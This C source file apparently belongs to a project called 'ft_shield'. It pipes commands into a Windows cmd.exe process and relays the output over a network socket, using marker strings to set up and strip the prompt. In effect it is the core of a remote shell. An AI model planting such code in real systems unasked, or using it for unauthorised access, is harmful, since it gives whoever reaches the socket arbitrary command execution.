
#include "ft_shield.h"

#define CMD_PROMPT "__FT_PROMPT_92A7__"
#define CMD_READY "__FT_READY_92A7__"
#define CMD_END "__FT_END_92A7__"

static int send_all(SOCKET slot, const char *buffer, int length)
{
	int total;
	int sent;

	total = 0;
	while (total < length)
	{
		sent = send(slot, buffer + total, length - total, 0);
		if (sent == SOCKET_ERROR || sent == 0)
			return (0);
		total += sent;
	}
	return (1);
}

static int cmd_write(t_cmd *cmd, const char *buffer, DWORD length)
{
	DWORD bytes_written;

	if (!WriteFile(cmd->stdin_write, buffer, length,
			&bytes_written, NULL))
		return (0);
	if (bytes_written != length)
		return (0);
	return (1);
}

static int send_clean_output(SOCKET slot, char *buffer)
{
	char *current;
	char *prompt;
	int length;

	current = buffer;
	while (1)
	{
		prompt = strstr(current, CMD_PROMPT);
		if (prompt == NULL)
			break;
		length = (int)(prompt - current);
		if (length > 0 && !send_all(slot, current, length))
			return (0);
		current = prompt + strlen(CMD_PROMPT);
	}
	length = (int)strlen(current);
	if (length > 0 && !send_all(slot, current, length))
		return (0);
	return (1);
}

static int cmd_read_until(t_cmd *cmd, SOCKET slot, const char *marker)
{
	char buffer[8192];
	char character;
	char *marker_position;
	DWORD bytes_read;
	int length;

	length = 0;
	while (1)
	{
		if (!ReadFile(cmd->stdout_read, &character, 1,
				&bytes_read, NULL))
			return (0);
		if (bytes_read == 0)
			return (0);

		if (length >= (int)sizeof(buffer) - 128)
		{
			if (slot != INVALID_SOCKET
				&& !send_all(slot, buffer, length))
				return (0);
			length = 0;
		}
		buffer[length++] = character;
		buffer[length] = '\0';

		if (character == '\n')
		{
			marker_position = strstr(buffer, marker);
			if (marker_position != NULL)
			{
				*marker_position = '\0';
				if (slot != INVALID_SOCKET
					&& !send_clean_output(slot, buffer))
					return (0);
				return (1);
			}
			if (slot != INVALID_SOCKET
				&& !send_clean_output(slot, buffer))
				return (0);
			length = 0;
		}
	}
}

int cmd_prepare(t_cmd *cmd)
{
	const char setup[] =
		"@echo off\r\n"
		"prompt " CMD_PROMPT "\r\n"
		"echo " CMD_READY "\r\n";

	if (cmd == NULL || cmd->stdin_write == NULL)
		return (0);
	if (!cmd_write(cmd, setup, sizeof(setup) - 1))
		return (0);
	return (cmd_read_until(cmd, INVALID_SOCKET, CMD_READY));
}

int cmd_exec(t_cmd *cmd, const char *command)
{
	const char end_command[] =
		"\r\n"
		"@echo off\r\n"
		"@prompt " CMD_PROMPT "\r\n"
		"@echo " CMD_END "\r\n";

	if (cmd == NULL || cmd->stdin_write == NULL || command == NULL)
		return (0);
	if (!cmd_write(cmd, command, (DWORD)strlen(command)))
		return (0);
	if (!cmd_write(cmd, end_command, sizeof(end_command) - 1))
		return (0);
	return (1);
}

int cmd_send_output(t_cmd *cmd, SOCKET slot)
{
	if (cmd == NULL || cmd->stdout_read == NULL)
		return (0);
	return (cmd_read_until(cmd, slot, CMD_END));
}
